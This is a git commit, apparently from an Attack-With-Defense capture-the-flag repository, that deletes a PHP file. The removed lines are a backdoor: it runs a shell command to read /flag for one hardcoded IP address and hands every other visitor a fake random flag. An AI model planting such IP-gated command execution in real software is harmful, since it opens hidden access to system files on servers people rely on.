05d9e0a856115e7325e0466868e154b8bd8758a4
ZacharyZcR <48591714+ZacharyZcR@users.noreply.github.com>
2019-08-02 21:45:45 +0800

    'delete.txt'

--- AWD/get_flag.php
+++
@@ -1,8 +0,0 @@
-<?php
-	$ip = $_SERVER["REMOTE_ADDR"];
-	if($ip=='117.173.217.106'){
-		echo("Administrator Confirmation.\r\n");
-		system("cat /flag");
-	}
-	else echo('flag{'.md5(mt_rand()).'}');
-//By ZacharyZcR
